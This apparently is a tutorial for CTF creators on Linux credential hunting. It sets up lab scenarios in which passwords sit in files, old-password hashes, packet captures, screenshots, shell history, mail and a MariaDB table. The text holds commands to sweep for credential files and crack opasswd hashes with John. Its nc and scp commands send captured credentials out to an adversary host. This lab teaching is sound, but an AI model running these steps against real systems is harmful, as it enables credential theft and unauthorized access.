# Linux Privilege Escalation - Credential Hunting  for CTF Creators


# Credential Hunting

Credential hunting is the practice of finding credentials in a system. These can either be encrypted, encoded, or in plain text. Some programs may store credentials in an encrypted format while others do not. 

# Privilege Escalation via Sensitive Files

In Linux, many files may contain passwords:

```shell
$ locate password | less           
/boot/grub/i386-pc/legacy_password_test.mod
<SNIP>
```

### Password Filename Scenario

Startup by installing locate:

```shell
sudo apt install mlocate
```

From the adversary's perspective, we can try to locate all the files that have in their name `password` as part of the filename:

```shell
$ locate password | less           
/boot/grub/i386-pc/legacy_password_test.mod
<SNIP>
```

Now we could attempt to list the permissions of each of these files with:

```shell
user@pwn:~$ locate password  | xargs ls -l
<SNIP>
-rw-rw-r-- 1 user  user     47 Jan  5 17:00 /home/user/Desktop/password.txt
```

Alternatively, we could just use the find command:

```shell
find / -iname "*password*" -exec ls -l {} \; 2>/dev/null
```

We could filter the output more by using the `-readable` option to find readable files by our current user.

```shell
find / -iname "*password*" -readable -exec ls -l {} \; 2>/dev/null
```

There are some directories in which I'm not interested so we can also filter directories that we're not interested in:

```shell
user@pwn:~$ find / -iname "*password*" -readable -exec ls -l {} \; 2>/dev/null | grep -Ev 'snap|boot|/share|/lib'
-rw-rw-r-- 1 user user 47 Jan  5 17:00 /home/user/Desktop/password.txt
<SNIP>
```

The first line from the output above is the only one that seems interesting to us:

```shell
user@pwn:~$ cat /home/user/Desktop/password.txt
Passwords:
	The user password is: pass321

```

Now, in a real-world machine (not common) or a CTF machine, we might find an interesting configuration file or a custom file that is not ordinary and might contain credentials.

# Privilege Escalation via Old Passwords

The `/etc/security/opasswd` file is used also by `pam_cracklib` to keep the history of old passwords so that the user will not reuse them. This file contains user password hashes.

I'm going to install the libraries first:

```shell
user@pwn:~$ sudo apt-cache search pam_cracklib
[sudo] password for user: 
libpam-cracklib - PAM module to enable cracklib support
libpam-pwquality - PAM module to check password strength
user@pwn:~$ sudo apt install libpam-cracklib libpam-pwquality
```

Now let's check if the shared objects files were created:

```shell
user@pwn:~$ find / -name 'pam_cracklib.so' 2>/dev/null
/usr/lib/x86_64-linux-gnu/security/pam_cracklib.so

user@pwn:~$ find / -name 'pam_unix.so' 2>/dev/null | grep -v snap
/usr/lib/x86_64-linux-gnu/security/pam_unix.so
```

The `opasswd` shall be treated as the `/etc/shadow` file because it will contain user password hashes, therefore the configuration is the following by default:

```shell
user@pwn:~$ ls -l /etc/security/opasswd
-rw------- 1 root root 0 Aug 19 06:29 /etc/security/opasswd
```

Once we've got the `opasswd` file set up, we can enable password history checking by adding the option `"remember=<x>"` to the `pam_unix` configuration line in the `/etc/pam.d/common-password` file. This enables the `pam_cracklib` module:

```shell
user@pwn:~$ cat /etc/pam.d/common-password
<SNIP>
password required pam_cracklib.so retry=3 minlen=12 difok=4
password required pam_unix.so md5 remember=12 use_authtok
```

> Note: Noticed how all the instructions before the last two lines are commented. I commented all of them to avoid conflict.

> Source: https://deer-run.com/users/hal/sysadmin/pam_cracklib.html

The number of old passwords we want to preserve for a user is the value of the "remember" option. Because there is an internal limit of 400 prior passwords, all values greater than 400 are identical to 400. Before we complain about this limit, keep in mind that 400 previous passwords represent nearly 30 years of password history, even if your site requires users to change passwords every 30 days it will stay working for 30 years.

Once we've enabled password history, the `opasswd` file starts filling up with user entries that look like this:

```shell
user:1000:<n>:<hash1>,<hash2>,...,<hashn>
```

The first two fields are the username and user ID. The `<n>` in the third field represents the number of old passwords currently being stored for the user--this value is incremented by one every time a new hash is added to the user's password history until `<n>` ultimately equals the value of the "remember" parameter set on the `pam_unix` configuration line. The `<hash1>,<hash2>,...,<hashn`>` are the MD5 password hashes for the user's old passwords.

Let's try to change the user password to `p@$$w0rd321!`:

```shell
user@pwn:~$ sudo passwd user
New password: 
Retype new password: 
BAD PASSWORD: is too simple
Retype new password: 
Sorry, passwords do not match.
New password: # p@$$w0rd321!
Retype new password: # p@$$w0rd321!
passwd: password updated successfully
user@pwn:~$ 
```

Based on the output above we can see that a weak password was detected. Let's try to change the password to something similar to the one that we just applied:

```shell
user@pwn:~$ passwd user
Changing password for user.
Current password: 
Changing password for user.
New password: # p@$$w0rd321!2
Retype new password: # p@$$w0rd321!2
BAD PASSWORD: is too similar to the old one
```

If we see the output above, we can see that the password is similar to the old one and therefore we need to use another password. If we try to use an old one:

```shell
user@pwn:~$ passwd user
Changing password for user.
Current password: 
Changing password for user.
New password: # p@$$w0rd321!
BAD PASSWORD: The password is the same as the old one
New password: # p@$$w0rdarlll!
Retype new password: # p@$$w0rdarlll!
passwd: password updated successfully

```

We can't use an old password based on the output above. Let's change the users' password:

```shell
user@pwn:~$ passwd user
Changing password for user.
Current password: 
New password: # p@$$ward331!
Retype new password: # p@$$ward331!
passwd: password updated successfully
```

This is an ideal way to change a password by avoiding using weak passwords, similar passwords to previous passwords and by not using old passwords.

Now let's try to read the `/etc/security/opasswd` file as root:

```shell
user@pwn:~$ sudo cat /etc/security/opasswd
user:1000:1:$1$xxxxxxxxxxxxxxxxxxxxxxxx.
```

If we had root UID using a SUID bit program that we can abuse then we could try to read this file, otherwise, if we had the root GID using `SGID` bit program that we can abuse we could also try to read this file. Alternatively, if we had a sudo command that we can perform a shell escape sequence then we can also try to read this file. Lastly, if the file was readable by other users and groups we could read this file as well. Anyways let's try to change the password to something that exists in the `rockyou.txt` wordlist.

In our adversary host, let's find a password that's 12 characters long in the `rockyou.txt` wordlist:

```shell
grep -E "^[A-Za-z]{12}$" /usr/share/wordlists/rockyou.txt | less
```

I'm going to use `p@$$w0rd!` as the new password:

```shell
user@pwn:~$ passwd user
Changing password for user.
Current password: # p@$$ward331!
New password: # p@$$w0rd!
Retype new password: # p@$$w0rd!
passwd: password updated successfully
```

If we read the `/etc/security/opasswd` again:

```shell
user@pwn:~$ sudo cat /etc/security/opasswd
user:1000:2:$1$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

We can see that the third column now has incremented to the number (`2`) and that there are two password hashes separated by a comma (`,`).  These hashes belong to `p@$$w0rdarlll!` and `p@$$ward331!` respectively. Now I want the password hash of the password `p@$$w0rd!` therefore, we'll change the password once again. This time I will use the password `p@$$w321` which is in the `rockyou.txt` dictionary:

```shell
user@pwn:~$ passwd user
Changing password for user.
Current password: # p@$$w0rd!
New password: # p@$$w321
Retype new password: # p@$$w321
passwd: password updated successfully
```

If we read `/etc/security/opasswd` file now:

```shell
user@pwn:~$ sudo cat /etc/security/opasswd
user:1000:3:$1$xxxxxxxxxxxxxxxxxxxxxxx,$1$xxxxxxxxxxxxxxxxxxx,$1$xxxxxxxxxxxxxxxxxxxxxxxx
```

Each of these hashes belongs to a different password.

I'm going to copy the hash of the last password hash and copy it to my adversary host:

```shell
❯ echo '$1$xxxxxxxxxxxxxxxxxxxxxx/' > hash.txt
```

Now I'm going to use `John` to attempt to crack the password hash using a dictionary attack:

```shell
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
<SNIP>
p@$$w0rd!     (?)
<SNIP>

❯ john hash.txt --show
?:p@$$w0rd!

1 password hash cracked, 0 left
```

As we can see the old password `p@$$w0rd!` was cracked. If this password was still in use by another user or if the administrator disabled this PAM functionality but forgot that the previous passwords were stored in the `/etc/security/opasswd` file and he/she decided to use an old password for a higher privileged user. We could attempt to switch to that user or at least try to log in as another user with the password that just cracked. Again this is just an example. 

At this step, I recommend that we restore a snapshot.

# Privilege Escalation via Plain Text Files Containing Passwords

Filter for the string password (case insensitive) in all file types and add some color:

```shell
grep --color=auto -rnw '/' -ie 'PASSWORD' --color=always 2>/dev/null
```

Find files and filter for the string password while being case insensitive:

```shell
find . -type f -exec grep -io -I "password" {} /dev/null \;
```

### Plain Text File Scenario

We will simply save a password into a text file:

```shell
echo -e 'Passwords:\n\tRoot user password is: pass123\n' > /home/user/Desktop/password.txt
```

This is how the output of the file `password.txt` looks:

```shell
user@pwn:~$ cat /home/user/Desktop/password.txt
Passwords:
	Root user password is: pass123

```

Now let's change to the adversary's perspective, startup by searching for the string `password` on all the system files:

```shell
user@pwn:~$ find . -type f -exec grep -io -I "password" {} /dev/null \;
./Desktop/password.txt:Password
./Desktop/password.txt:password
<SNIP>
```

Looking at the first two lines of the output above, we can see the file that we created earlier. The next step would be to check if we have read permissions on this file:

```shell
user@pwn:~$ ls -l ./Desktop/password.txt
-rw-rw-r-- 1 user user 44 Jan  5 16:23 ./Desktop/password.txt
```

Viewing the output above, we can see that we have read permissions, now we can read the file and see if it contains passwords:

```shell
user@pwn:~$ cat ./Desktop/password.txt
Passwords:
	Root user password is: pass123

user@pwn:~$ 
```

It seems that the root password is `pass123`, let's try to switch to the root user and log in with this password:

```shell
user@pwn:~$ su root
Password: 
root@pwn:/home/user# whoami
root
root@pwn:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@pwn:/home/user# 
```

As we can see, we were able to escalate privileges by simply finding a password string in a file called `password.txt` which is stored on the user's desktop. This is a common misconfiguration that client users might do on their workstations. As system administrators, we shall know that this is very **uncommon** or at least it should be avoided.

# Privilege Escalation via Network Packets

Let's not forget one of the most basic things when it comes to information security and that is protocols that are not encrypted. Yes, we may be able to capture some traffic of a protocol like FTP, HTTP or Telnet, someone logins and we capture those credentials. Sometimes system administrators that are monitoring the network may forget that they have stored some of these captures in PCAP files. If an adversary manages to compromise the system and read one of these captures he/she may find some valid credentials.

### Wireshark Capture Scenario (FTP)

Startup by installing an FTP service and a Network Sniffer in this case Wireshark:

```shell
sudo apt update && sudo apt install -y vsftpd wireshark 
```

Now let's configure the FTP service:

```shell
sudo vim /etc/vsftpd
```

Now add or uncomment the following lines (if already added in the file):

```shell
listen=NO  
anonymous_enable=NO  
local_enable=YES  
write_enable=YES  
local_umask=022  
dirmessage_enable=YES  
use_localtime=YES  
xferlog_enable=YES  
connect_from_port_20=YES  
chroot_local_user=YES  
secure_chroot_dir=/var/run/vsftpd/empty  
pam_service_name=vsftpd  
#rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem  
#rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key  
ssl_enable=No  
pasv_enable=Yes  
pasv_min_port=10000  
pasv_max_port=10100  
allow_writeable_chroot=YES  
ssl_tlsv1=NO  
ssl_sslv2=NO  
ssl_sslv3=NO
```

Once done, save and close the `/etc/vsftpd.conf` file.

Run the service and check its status:

```shell
sudo systemctl enable vsftpd.service && sudo systemctl restart vsftpd.service && sudo systemctl status vsftpd.service
```

Now run wireshark in the localhost interface card:

```shell
sudo wireshark
```

Select the loopback interface:

{{< image src="/images/posts/wireshark-loopback.png" caption="Wireshark Loopback" src_s="/images/posts/wireshark-loopback.png" src_l="/images/posts/wireshark-loopback.png" >}}

Test FTP connection locally:

```shell
user@pwn:~$ ftp localhost
Connected to localhost.
220 (vsFTPd 3.0.3)
Name (localhost:user): user
331 Please specify the password.
Password: # pass321
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Capture the FTP packets in the loopback interface and follow the TCP stream and save the capture. Then change the ownership of the file to our user and group:

```shell
user@pwn:~$ sudo chown user:user /home/user/Desktop/ftp-creds.pcapng
```

Now from the adversary's perspective, we can enumerate pcap files:

```shell
user@pwn:~$ find / -name '*.pcap*' 2>/dev/null | grep -v snap
/home/user/Desktop/ftp-creds.pcapng
/usr/share/mime/application/vnd.tcpdump.pcap.xml
```

We found the file `/home/user/Desktop/ftp-creds.pcapng` let's attempt to transfer this file to our adversary host.

The last time we did a file transfer we used `scp`, this time around I'm going to use `nc`  just to keep things different:

```shell
user@pwn:~$ which nc
/usr/bin/nc
```

Set up a listener on your adversary host:

```shell
❯ nc -l -p 1234 > ftp-creds.pcapng
```

Send the `pcapng` file to the adversary host:

```shell
sudo nc -w 3 10.10.10.15 1234 < /home/user/Desktop/ftp-creds.pcapng
```

Verify the checksum on the victim/target host/machine:

```shell
user@pwn:~$ md5sum /home/user/Desktop/ftp-creds.pcapng
xxxxxxxxxxxxxxxx  /home/user/Desktop/ftp-creds.pcapng
```

Verify the checksum on our adversary host/machine:

```shell
❯ md5sum ftp-creds.pcapng
xxxxxxxxxxxxxxxx  ftp-creds.pcapng
```

The hashes are the same which means that the integrity of the file is the same which means that they are the same files.

Now let's open wireshark in our adversary host/machine:

{{< image src="/images/posts/open-wireshark-capture.png" caption="Open Wireshark Capture" src_s="/images/posts/open-wireshark-capture.png" src_l="/images/posts/open-wireshark-capture.png" >}}

Follow the TCP stream of the capture to find the credentials.

# Privilege Escalation via Images

Screenshots or pictures/photos of credentials is very a common mistake that could happen anywhere.

### Screenshot Scenario

To demonstrate this example, I'm going to use `flameshot` to take a screenshot. we can use any screenshot tool.

```shell
sudo apt update && sudo apt install flameshot
```

Then I'm going to execute `flameshot`:

{{< image src="/images/posts/flameshot-icon.png" caption="Flameshot Icon" src_s="/images/posts/flameshot-icon.png" src_l="/images/posts/flameshot-icon.png" >}}

Now I'm going to take a screenshot:

{{< image src="/images/posts/take-screenshot.png" caption="Flameshot Take Screenshot" src_s="/images/posts/take-screenshot.png" src_l="/images/posts/take-screenshot.png" >}}

Select the area that we want to screenshot. Use any text editor of your choosing.

{{< image src="/images/posts/screenshot-password.png" caption="Flameshot Screenshot Password" src_s="/images/posts/screenshot-password.png" src_l="/images/posts/screenshot-password.png" >}}

Save it to the Pictures directory:

{{< image src="/images/posts/password-png.png" caption="Password" src_s="/images/posts/password-png.png" src_l="/images/posts/password-png.png" >}}

From the adversary's perspective we can see this image stored in the `/home/user/Pictures` directory:

```shell
user@pwn:~$ ls -l Pictures/
total 8
-rw-rw-r-- 1 user user 7955 Jan  5 20:43 password.png
```

As we can see from the above this looks very interesting, as an adversary we could try to transfer this image to our adversary host. There are many ways in which we could transfer files. I'm just going to keep it simple by using scp. Let's check if scp is installed in the target/victim machine:

```shell
user@pwn:~$ which scp
/usr/bin/scp
user@pwn:~$ 
```

Now we're going to use the adversary host/machine and view our IP address:

```shell
❯ ip -color=auto --brief address show
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0             UP             10.10.10.15/24 fe80::20c:29ff:fec5:fd0/64
```

Lastly, let's start the SSH service in our adversary host:

```shell
❯ sudo systemctl start ssh && sudo systemctl status ssh | grep active
     Active: active (running) since Wed 2021-01-05 19:51:46 EST; 7min ago
```

From the victim machine/target let's log in to our SSH service and transfer the file at the same time with scp:

```shell
user@pwn:~$ scp /home/user/Pictures/password.png kali@10.10.10.15:/home/kali/Pictures
The authenticity of host '10.10.10.15 (10.10.10.15)' can't be established.
ECDSA key fingerprint is SHA256:+sekweCXMu7Qr1XeTiYW4Ucu6gvZVtcBJy7UtbzemsI.
Are we sure we want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.15' (ECDSA) to the list of known hosts.
kali@10.10.10.15's password: 
password.png                                                                                                                                100% 7955     6.6MB/s   00:00    
user@pwn:~$ 
```

Now in our adversary host/machine, let's navigate to the `/home/kali/Pictures` directory:

```shell
❯ ls -l ~/Pictures | grep password
.rw-r--r-- kali kali 7.8 KB Wed Jan  5 20:01:31 2021 password.png
```

As we can see from the output above, the image has been transferred. Let's open this image with an image viewer:

```shell
❯ which ristretto
/usr/bin/ristretto

❯ ristretto /home/kali/Pictures/password.png
```

The image has been opened and now we can see its contents:

{{< image src="/images/posts/image-password.png" caption="Image Password" src_s="/images/posts/image-password.png" src_l="/images/posts/image-password.png" >}}

Now we know a potential password. We could try to use a password re-use technique or simply try to switch to the root user with this password that we found.

# Privilege Escalation via History Files

We might see credentials in the console/shell history, sometimes some people do enter credentials to command parameters as arguments. This can be seen when someone wants to connect remotely to a database without interaction when using commands like `sshpass` or `mysql`:

```shell
cat ~/.history
history
```

### sshpass Scenario

Let's install `sshpass`  and the `ssh-client`:

```shell
sudo apt install sshpass ssh
```

Restart the ssh service and check its status:

```shell
user@pwn:~$ sudo systemctl restart sshd.service && sudo systemctl status sshd.service 
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
     Active: active (running) since Wed 2021-01-05 20:25:36 AST; 11ms ago
       Docs: man:sshd(8)
             man:sshd_config(5)
    Process: 26904 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
   Main PID: 26905 (sshd)
      Tasks: 1 (limit: 4599)
     Memory: 1.0M
     CGroup: /system.slice/ssh.service
             └─26905 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
<SNIP>
```

Now let's authenticate to localhost using sshpass so we can avoid an interactive logon:

```shell
user@pwn:~$ sshpass -p pass321 ssh -o StrictHostKeyChecking=no user@localhost
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-43-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

13 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Your Hardware Enablement Stack (HWE) is supported until April 2025.
*** System restart required ***
Last login: Tue Dec 20 21:27:18 2021 from 10.10.10.15
user@pwn:~$ 
```

Let's exit out of the SSH shell:

```shell
user@pwn:~$ exit
logout
Connection to localhost closed.
user@pwn:~$ 
****
```

Now from the adversary's perspective, we can attempt to read the history of the shell:

```shell
cat ~/.bash_history; echo "history command output:"; history
```

Let's filter this output:

```shell
user@pwn:~$ cat ~/.bash_history | grep sshpass
sudo apt install sshpass
sshpass -p pass321 ssh user@localhost
sudo apt install sshpass ssh
sshpass
sshpass -p pass321 ssh user@localhost -p 22

user@pwn:~$ history | grep sshpass
  643  sudo apt install sshpass
  644  sshpass -p pass321 ssh user@localhost
  646  sudo apt install sshpass ssh
  648  sshpass
  652  sshpass -p pass321 ssh user@localhost -p 22
  655  sshpass -p exitu2tryhack ssh -o StrictHostKeyChecking=no user@localhost
  656  sshpass -p pass321 ssh -o StrictHostKeyChecking=no user@localhost
```

As we can see from the output above, we have found a potential password which is `pass321`. As an adversary, we could try to use this password with all the users that have `bash`/`zsh`/`sh` shell defined on the system. This can be found in the `/etc/passwd` file:

```shell
user@pwn:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:user,,,:/home/user:/bin/bash
user:x:1001:1001:,,,:/home/user:/bin/bash
test:x:1002:1002::/home/test:/bin/sh
```

We could try to log in either with SSH, Telnet, FTP, NFS, or any other service or locally try the password we found which is `pass321` on all these users. This technique is also known as password reuse. As system administrators, we shall never use the same password for other users or services.

Here we can read a Red Hat Documentation on how we can use [sshpass](https://www.redhat.com/sysadmin/ssh-automation-sshpass)

## Emails

Sending credentials via email is a very common mistake that I have seen in the real world. Let's try to find credentials in the emails of the system.

### SMTP Postfix Scenario

Let's startup by setting up an SMTP server.

Set a valid **FQDN** (**Fully Qualified Domain Name**) hostname for our Ubuntu system using the [hostnamectl command](https://www.tecmint.com/hostname-command-examples-for-linux/) as shown here:

```shell
sudo hostnamectl set-hostname mail.user.com
```

Now the hostname has changed:

```shell
user@pwn:~$ hostname
mail.user.com
```

**Postfix** is a mail transfer agent (**MTA**) which is the responsible software for delivering & receiving emails, it’s essential to create a complete mail server.

```shell
sudo apt update && sudo apt install postfix
```

I'm going to set up an `Internet Site` although my VM is not on the Internet but rather in a virtualized LAN network. Once Postfix is installed, it will automatically start and creates a new **/etc/postfix/main.cf** file. we can verify the Postfix version and status of the service using the following commands.

```shell
user@pwn:~$ postconf mail_version
mail_version = 3.4.13
user@pwn:~$ sudo systemctl status postfix
● postfix.service - Postfix Mail Transport Agent
     Loaded: loaded (/lib/systemd/system/postfix.service; enabled; vendor preset: enabled)
     Active: active (exited) since Thu 2021-01-06 19:47:03 AST; 1min 10s ago
   Main PID: 6685 (code=exited, status=0/SUCCESS)
      Tasks: 0 (limit: 4599)
     Memory: 0B
     CGroup: /system.slice/postfix.service

Jan 06 19:47:03 mail.user.com systemd[1]: Starting Postfix Mail Transport Agent...
Jan 06 19:47:03 mail.user.com systemd[1]: Finished Postfix Mail Transport Agent.
```

The mail configuration file looks like this:

```shell
user@pwn:~$ sudo cat  /etc/postfix/main.cf
# See /usr/share/postfix/main.cf.dist for a commented, more complete version


# Debian specific:  Specifying a file name will cause the first
# line of that file to be used as the name.  The Debian default
# is /etc/mailname.
#myorigin = /etc/mailname

smtpd_banner = $myhostname ESMTP $mail_name (Ubuntu)
biff = no

# appending .domain is the MUA's job.
append_dot_mydomain = no

# Uncomment the next line to generate "delayed mail" warnings
#delay_warning_time = 4h

readme_directory = no

# See http://www.postfix.org/COMPATIBILITY_README.html -- default to 2 on
# fresh installs.
compatibility_level = 2



# TLS parameters
smtpd_tls_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem
smtpd_tls_key_file=/etc/ssl/private/ssl-cert-snakeoil.key
smtpd_tls_security_level=may

smtp_tls_CApath=/etc/ssl/certs
smtp_tls_security_level=may
smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache


smtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_unauth_destination
myhostname = mail.user.com
alias_maps = hash:/etc/aliases
alias_database = hash:/etc/aliases
myorigin = /etc/mailname
mydestination = $myhostname, mail.user.com, localhost.user.com, localhost
relayhost = 
mynetworks = 127.0.0.0/8 [::ffff:127.0.0.0]/104 [::1]/128
mailbox_size_limit = 0
recipient_delimiter = +
inet_interfaces = loopback-only
default_transport = error
relay_transport = error
inet_protocols = all
```

The `inet_interfaces` variable declares the interfaces in which the service will listen:

```shell
inet_interfaces = loopback-only
```

As we can see this is only listening on the loopback interface in IPv4 and IPv6 but we need to send emails from another host/machines/nodes so we need this service to be listening on the ethernet interface. This is what happens if we select `loopback only` option during the installation configuration. We can change this by adding our interfaces' IP addresses:

```shell
user@pwn:~$ ip --color=auto --brief addr
lo               UNKNOWN        127.0.0.1/8 ::1/128 
ens33            UP             10.10.10.14/24 fe80::8450:b1b6:be0a:a735/64 
```

Let's modify the `inet_interfaces` variable and add the IP address of our ethernet interface:

```shell
inet_interfaces = 10.10.10.14, 127.0.0.1
```

Restart the postfix service to apply the changes:

```shell
user@pwn:~$ sudo systemctl restart postfix
user@pwn:~$ sudo systemctl status postfix
● postfix.service - Postfix Mail Transport Agent
     Loaded: loaded (/lib/systemd/system/postfix.service; enabled; vendor preset: enabled)
     Active: active (exited) since Thu 2021-01-06 20:09:30 AST; 3s ago
    Process: 10037 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 10037 (code=exited, status=0/SUCCESS)

Jan 06 20:09:30 mail.user.com systemd[1]: Starting Postfix Mail Transport Agent...
Jan 06 20:09:30 mail.user.com systemd[1]: Finished Postfix Mail Transport Agent.
```

Check if the service is listening on the ethernet interface:

```shell
user@pwn:~$ ss -tnlp | grep 25
LISTEN  0       100              127.0.0.1:25            0.0.0.0:*              
LISTEN  0       100        10.10.10.14:25            0.0.0.0:*   
```

We can enumerate this service using `Nmap`:

```shell
❯ sudo nmap -p 25 --min-rate 5000 -sCV 10.10.10.14
Starting Nmap 7.92 ( https://nmap.org ) at 2021-01-06 19:11 EST
Nmap scan report for 10.10.10.14
Host is up (0.00032s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: mail.user.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-12-20T23:54:25
|_Not valid after:  2031-12-18T23:54:25
MAC Address: 00:0C:29:35:5B:CD (VMware)
Service Info: Host:  mail.user.com

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds
```

Now let's try to send an email from any other machine that's on our virtualized LAN network. We can use tools like telnet, nc, or swaks to send emails via the terminal:

```shell
❯ nc -nv 10.10.10.14 25
(UNKNOWN) [10.10.10.14] 25 (smtp) open
220 mail.user.com ESMTP Postfix (Ubuntu)
HELO x
250 mail.user.com
QUIT
221 2.0.0 Bye

❯ telnet 10.10.10.14 25
Trying 10.10.10.14...
Connected to 10.10.10.14.
Escape character is '^]'.
220 mail.user.com ESMTP Postfix (Ubuntu)
HELO x
250 mail.user.com
QUIT
221 2.0.0 Bye
Connection closed by foreign host.
```

Alright, let's send an email:

```shell
❯ swaks --server 10.10.10.14 --port 25 --from 'user@mail.com' --to 'user@mail.user.com' --body 'Hi, the root password is: root'
=== Trying 10.10.10.14:25...
=== Connected to 10.10.10.14.
<-  220 mail.user.com ESMTP Postfix (Ubuntu)
 -> EHLO kali
<-  250-mail.user.com
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<user@mail.com>
<-  250 2.1.0 Ok
 -> RCPT TO:<user@mail.user.com>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 06 Jan 2021 19:20:27 -0500
 -> To: user@mail.user.com
 -> From: user@mail.com
 -> Subject: test Thu, 06 Jan 2021 19:20:27 -0500
 -> Message-Id: <20210106192027.083181@kali>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 ->
 -> Hi, The root password is: root
 ->
 ->
 -> .
<-  250 2.0.0 Ok: queued as CC8EAA5619
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
```

Alright as the adversary let's find this email in the target machine:

```shell
user@pwn:~$ cat /var/mail/user
From user@mail.com  Thu Jan  6 20:20:27 2021
Return-Path: <user@mail.com>
X-Original-To: user@mail.user.com
Delivered-To: user@mail.user.com
Received: from kali (unknown [10.10.10.15])
	by mail.user.com (Postfix) with ESMTP id CC8EAA5619
	for <user@mail.user.com>; Thu,  6 Jan 2021 20:20:27 -0400 (AST)
Date: Thu, 06 Jan 2021 19:20:27 -0500
To: user@mail.user.com
From: user@mail.com
Subject: test Thu, 06 Jan 2021 19:20:27 -0500
Message-Id: <20210106192027.083181@kali>
X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/

Hi, The root password is: root
```

As we can see from the output above, we can find emails that were sent to this server in the `/var/mail` directory. Since this user sent a password we could try to use this password against all the users in the system or simply try to log in as the root user as specified in the message.

# Privilege Escalation via Databases

It is very common to see credentials in databases that belong to web applications. Often the passwords of these credentials are hashed but sometimes we might see them in plaintext. 

### MariaDB Scenario:

For the sake of simplicity, I'm just gonna create a simple database with one table that contains credentials in plaintext.

Install the MySQL client:

```shell
sudo apt install -y mariadb-server mariadb-client
```

Login to the MySQL service in localhost:

```shell
user@pwn:~$ sudo mysql -h localhost -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 54
Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

Let's create a MariaDB user:

```sql
MariaDB [mysql]> USE mysql;
Database changed
MariaDB [mysql]> CREATE USER 'user'@'localhost' IDENTIFIED BY 'pass321';
Query OK, 0 rows affected (0.001 sec)

MariaDB [mysql]> GRANT ALL PRIVILEGES ON *.* TO 'user'@'localhost';
Query OK, 0 rows affected (0.000 sec)

MariaDB [mysql]> UPDATE user SET plugin='unix_socket' WHERE User='user';
Query OK, 1 row affected (0.001 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MariaDB [mysql]> FLUSH PRIVILEGES;
Query OK, 0 rows affected (0.001 sec)

MariaDB [mysql]> exit;
Bye
```

> Note: A of MySQL 8.0.4 the new default authentication plugin is 'caching_sha2_password' which we can log in from the Bash shell now with "mysql -u YOUR_SYSTEM_USER -p" and provide the password for this user on the prompt. There isn’t any need for the "UPDATE user SET plugin" step.

Restart the MySQL service:

```shell
sudo service mysql restart
```

Show the databases:

```shell
MariaDB [(none)]> SHOW databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
3 rows in set (0.001 sec)
```

Create a database called `test`:

```sql
MariaDB [(none)]> CREATE DATABASE test;
Query OK, 1 row affected (0.003 sec)
```

Use the [`SHOW`](https://dev.mysql.com/doc/refman/8.0/en/show.html "13.7.7 SHOW Statements") statement to find out what databases currently exist on the server:

```sql
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| test               |
+--------------------+
4 rows in set (0.001 sec)
```

Use the `USE` statement to use the database:

```sql
MariaDB [(none)]> USE test;
Database changed
MariaDB [test]> 
```

Create a table with usernames and passwords:

```sql
CREATE TABLE `users` (
  `id` int NOT NULL AUTO_INCREMENT,
  `employee_id` int DEFAULT NULL,
  `user_type` varchar(50) DEFAULT NULL,
  `username` varchar(100) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
```

The query looks like these in MariaDB:

```sql
MariaDB [test]> CREATE TABLE `users` (
    ->   `id` int NOT NULL AUTO_INCREMENT,
    ->   `employee_id` int DEFAULT NULL,
    ->   `user_type` varchar(50) DEFAULT NULL,
    ->   `username` varchar(100) NOT NULL,
    ->   `password` varchar(100) NOT NULL,
    ->   PRIMARY KEY (`id`)
    -> ) ENGINE=InnoDB DEFAULT CHARSET=utf8;
Query OK, 0 rows affected (0.010 sec)
```

Insert data into the users' table:

```sql
INSERT INTO `users` (`employee_id`, `user_type`, `username`, `password`) VALUES
